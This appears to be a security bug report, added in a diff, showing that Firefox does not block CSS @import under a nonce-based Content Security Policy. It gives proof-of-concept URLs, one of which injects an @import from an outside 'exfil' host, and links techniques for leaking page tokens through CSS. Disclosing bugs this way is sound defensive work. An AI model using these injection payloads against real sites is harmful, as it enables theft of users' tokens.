@@ -1,0 +1,11 @@
+When user is able to inject CSS in some page protected by CSP nonce, firefox won't block @import requests making possible to leak sensitive content data.
+Mozilla Developer Network documentation (https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src
+) says: "You can use a nonce-source to only allow specific inline style blocks"
+So it seems that page should block intead of load arbitrary styles, as chrome does.
+PoC:
+To demonstrate this bug I wrote a web page that receives CSS from a parameter 'css' and insert it into a nonced style in page: http://abrasax.club/csp/css/?css=body{background-color:%20blue;}
+the CSP defined by this page is: Content-Security-Policy: default-src 'self'; style-src 'nonce-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'; img-src data: http: https:; font-src data: http https
+When some user abuse include @import tag the external content is included without get blocked by firefox: http://abrasax.club/csp/css/?css=@import%20url(https://l4t.cc/exfil/a.css);
+when the same url is displayed in chrome it gets blocked, even if the source content becomes from the same domain: http://abrasax.club/csp/css/?css=@import%20url(./b.css);
+So it becomes possible to abuse the load of @import exfiltrate leak page information, like tokens that didn't change in every request, small token's that reload for each request and for bigger tokens that reload for each refresh (using @import tehcnique: https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b or using font technique: https://twitter.com/terjanq/status/1180477124861407234)
+I also sent 2 videos in attachments showing attack examples.
